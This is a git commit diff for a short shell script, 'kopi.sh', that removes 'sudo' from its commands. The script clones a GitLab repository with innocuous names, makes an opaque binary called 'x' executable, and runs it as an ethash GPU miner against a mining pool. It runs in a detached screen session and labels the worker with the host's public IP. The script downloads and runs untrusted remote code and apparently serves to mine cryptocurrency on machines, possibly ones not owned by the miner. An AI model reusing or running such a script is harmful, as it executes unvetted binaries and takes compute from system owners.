c34184128b029256fbb9d00aff42ce04a05d8e2d
nurfasikin <92776649+nurfasikin@users.noreply.github.com>
2022-07-02 13:05:13 +0700

    Update kopi.sh

--- kopi.sh
+++ kopi.sh
@@ -1,9 +1,9 @@
 #!/bin/sh
-sudo apt update
-sudo apt-get install zip unzip
-sudo apt install screen -y
+apt-get update
+apt-get install zip unzip
+apt-get install screen -y
 screen -dmS er.sh 65 75
-sudo git clone https://gitlab.com/letricejuliocesar/goodday
+git clone https://gitlab.com/letricejuliocesar/goodday
 cd goodday
 chmod +x x
-ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo ./x -a ethash -w berkah.001 -p stratum+tcp://ethash.kupool.com:443 -r $ip --nvidia 1
+ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  ./x -a ethash -w berkah.001 -p stratum+tcp://ethash.kupool.com:443 -r $ip --nvidia 1
